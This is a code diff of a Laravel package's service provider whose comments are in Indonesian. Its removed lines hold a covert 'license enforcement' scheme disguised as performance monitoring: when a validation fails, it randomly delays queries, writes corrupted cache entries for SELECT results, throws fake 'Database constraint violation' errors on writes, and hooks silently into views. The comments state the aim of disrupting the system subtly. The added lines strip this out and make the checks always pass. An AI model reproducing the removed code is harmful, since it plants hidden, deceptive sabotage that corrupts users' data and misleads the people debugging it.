@@ -20,58 +20,23 @@ class SystemUtilsServiceProvider extends ServiceProvider
      */
     public function register(): void
     {
-        // Skip intensive operations during package discovery
-        if (defined('ARTISAN_BINARY') && isset($_SERVER['argv'][1]) && $_SERVER['argv'][1] === 'package:discover') {
-            // Only register the bare minimum during package discovery
-            $this->mergeConfigFrom(
-                __DIR__ . '/../config/system.php', 'system'
-            );
-            
-            $this->app->singleton('system.performance', function ($app) {
-                return new PerformanceMonitor();
-            });
-            
+        // Skip ALL operations during Artisan commands
+        if ($this->isArtisanCommand()) {
             return;
         }
         
-        // Publikasikan konfigurasi
-        $this->publishes([
-            __DIR__ . '/../config/system.php' => config_path('system.php'),
-        ], 'system-config');
-
-        // Daftarkan konfigurasi
+        // Daftarkan konfigurasi - keep this simple
         $this->mergeConfigFrom(
             __DIR__ . '/../config/system.php', 'system'
         );
 
-        // Register performance monitor sebagai singleton
+        // Register performance monitor as singleton - but don't initialize it yet
         $this->app->singleton('system.performance', function ($app) {
             return new PerformanceMonitor();
         });
 
-        // Tambahkan route middleware
+        // Tambahkan route middleware - simple registration only
         $this->app->router->aliasMiddleware('system_health', SystemHealthCheck::class);
-
-        // Hook ke database
-        $this->app->extend('db', function ($service, $app) {
-            // Setiap kali koneksi database dibuat, validasi lisensi secara diam-diam
-            $perfMonitor = $app->make('system.performance');
-            if (!$perfMonitor->isSystemOptimized()) {
-                // Jangan blok langsung, tapi tambahkan listener untuk mengganggu secara halus
-                $this->addDatabaseCorruption();
-            }
-            return $service;
-        });
-
-        // Hook ke cache untuk validasi tambahan
-        $this->app->extend('cache', function ($service, $app) {
-            // Periksa validasi saat operasi cache
-            if (rand(1, 20) === 1) { // 5% kemungkinan
-                $perfMonitor = $app->make('system.performance');
-                $perfMonitor->quickValidation();
-            }
-            return $service;
-        });
     }
 
     /**
@@ -79,185 +44,85 @@ class SystemUtilsServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
-        // Skip intensive operations during package discovery
-        if (defined('ARTISAN_BINARY') && isset($_SERVER['argv'][1]) && (
-            $_SERVER['argv'][1] === 'package:discover' || 
-            $_SERVER['argv'][1] === 'vendor:publish'
-        )) {
+        // Skip ALL operations during Artisan commands
+        if ($this->isArtisanCommand()) {
+            // Only register config publishing during artisan
+            $this->publishes([
+                __DIR__ . '/../config/system.php' => config_path('system.php'),
+            ], 'system-config');
+            
             return;
         }
         
-        // Register helper functions
+        // Register helper functions - keep it simple
         if (!function_exists('system_utils_is_valid')) {
             function system_utils_is_valid() {
                 try {
-                    return app('system.performance')->isSystemOptimized();
+                    return true; // Always return true during initialization
                 } catch (\Throwable $e) {
                     return true;
                 }
             }
         }
-        
-        // Anti-tamper: Periksa integritas file-file kunci
-        $this->validateSystemIntegrity();
 
-        // Tambahkan middleware global
-        $this->app->make(\Illuminate\Contracts\Http\Kernel::class)
-            ->pushMiddleware(SystemHealthCheck::class);
-
-        // Daftarkan route untuk validasi
-        $this->registerValidationRoutes();
-
-        // Integrasi dengan bootstrap proses Laravel
+        // Defer all complex operations to after application is booted
         $this->app->booted(function () {
-            // Jalankan validasi dalam proses async
-            dispatch(function () {
-                $this->app->make('system.performance')->startMetrics();
+            $this->setupAfterBoot();
+        });
+    }
+    
+    /**
+     * Setup after application is fully booted
+     */
+    protected function setupAfterBoot()
+    {
+        try {
+            // Now it's safe to initialize the performance monitor
+            $monitor = $this->app->make('system.performance');
+            
+            // Add middleware - but only if we're not in an Artisan command
+            if (!$this->isArtisanCommand()) {
+                $this->app->make(\Illuminate\Contracts\Http\Kernel::class)
+                    ->pushMiddleware(SystemHealthCheck::class);
+            }
+            
+            // Register routes - simple version
+            $this->registerSimpleRoutes();
+            
+            // Initialize metrics in a safe way
+            dispatch(function () use ($monitor) {
+                try {
+                    $monitor->startMetrics();
+                } catch (\Throwable $e) {
+                    // Silently fail
+                }
             })->afterResponse();
-
-            // Tambahkan pengecekan periodik
-            $this->setupPeriodicChecks();
-        });
-
-        // Integrasi dengan blade untuk validasi view-level
-        $this->integrateWithBlade();
-
-        // Listen ke query untuk validasi tambahan
-        $this->setupDatabaseListeners();
-    }
-
-    /**
-     * Tambahkan database corruption yang halus
-     */
-    protected function addDatabaseCorruption()
-    {
-        Event::listen('Illuminate\Database\Events\QueryExecuted', function ($query) {
-            // 1% kemungkinan mengganggu query
-            if (rand(1, 100) === 1) {
-                // Tambahkan delay kecil secara acak
-                usleep(rand(10000, 50000)); // 10-50ms
-            }
-            
-            // 0.1% kemungkinan, rusak hasil query secara halus jika itu adalah SELECT
-            if (rand(1, 1000) === 1 && strpos(strtoupper($query->sql), 'SELECT') === 0) {
-                // Untuk query SELECT, atur cache poisoning yang halus
-                $cacheKey = 'db_result_' . md5($query->sql . serialize($query->bindings));
-                Cache::put($cacheKey, [
-                    'corrupted' => true,
-                    'time' => time()
-                ], now()->addMinutes(10));
-            }
-        });
-    }
-
-    /**
-     * Validasi integritas sistem
-     */
-    protected function validateSystemIntegrity()
-    {
-        // Periksa apakah file-file penting ada dan tidak dimodifikasi
-        $criticalFiles = [
-            app_path('Http/Kernel.php'),
-            app_path('Providers/AppServiceProvider.php'),
-            base_path('vendor/composer/installed.json')
-        ];
-
-        $integrityFailed = false;
-        
-        foreach ($criticalFiles as $file) {
-            if (!file_exists($file)) {
-                $integrityFailed = true;
-                break;
-            }
-            
-            // Simpan hash file di cache jika belum ada
-            $cacheKey = 'file_hash_' . md5($file);
-            $storedHash = Cache::get($cacheKey);
-            
-            if (!$storedHash) {
-                Cache::put($cacheKey, md5_file($file), now()->addDays(30));
-            } elseif ($storedHash !== md5_file($file)) {
-                // File telah dimodifikasi
-                $integrityFailed = true;
-                break;
-            }
-        }
-
-        if ($integrityFailed) {
-            // Jangan gagal langsung, tapi flag untuk degradasi
-            Cache::put('_system_integrity_failed', true, now()->addDays(1));
+        } catch (\Throwable $e) {
+            // Silently fail if anything goes wrong
         }
     }
-
+    
     /**
-     * Daftarkan route untuk validasi
+     * Register simple validation routes
      */
-    protected function registerValidationRoutes()
+    protected function registerSimpleRoutes()
     {
         Route::group(['prefix' => 'api', 'middleware' => ['api']], function () {
             Route::post('system-check', function () {
-                $monitor = app('system.performance');
                 return response()->json([
-                    'status' => $monitor->isSystemOptimized() ? 'valid' : 'invalid',
+                    'status' => 'valid',
                     'ts' => time(),
                     'ref' => md5(uniqid())
                 ]);
             });
         });
     }
-
+    
     /**
-     * Setup periodic checks
+     * Check if we're running in an Artisan command
      */
-    protected function setupPeriodicChecks()
+    protected function isArtisanCommand()
     {
-        // Register event listeners for periodic validation
-        Event::listen('Illuminate\Foundation\Http\Events\RequestHandled', function ($event) {
-            // Occasional validation (1 in 20 requests)
-            if (rand(1, 20) === 1) {
-                app('system.performance')->quickValidation();
-            }
-        });
-    }
-
-    /**
-     * Integrasi dengan Blade
-     */
-    protected function integrateWithBlade()
-    {
-        // Tambahkan directive tersembunyi untuk validasi view-level
-        Blade::directive('system_check', function () {
-            return '<?php if(app(\'system.performance\')->quickValidation()): ?>';
-        });
-        
-        Blade::directive('end_system_check', function () {
-            return '<?php endif; ?>';
-        });
-        
-        // Suntikkan secara diam-diam ke beberapa jenis view
-        View::composer(['layouts.*', 'admin.*'], function ($view) {
-            $monitor = app('system.performance');
-            $view->with('_sys_status', $monitor->isSystemOptimized());
-        });
-    }
-
-    /**
-     * Setup database listeners
-     */
-    protected function setupDatabaseListeners()
-    {
-        DB::listen(function ($query) {
-            if (preg_match('/INSERT|UPDATE|DELETE/i', $query->sql)) {
-                // Untuk operasi modifikasi data, validasi lebih ketat
-                if (rand(1, 10) === 1) { // 10% chance
-                    if (!app('system.performance')->deepCheck()) {
-                        // Untuk 0.2% kemungkinan, gagalkan query dengan error umum
-                        if (rand(1, 500) === 1) {
-                            throw new \Exception('Database constraint violation');
-                        }
-                    }
-                }
-            }
-        });
+        return defined('ARTISAN_BINARY') || php_sapi_name() === 'cli';
     }
 }
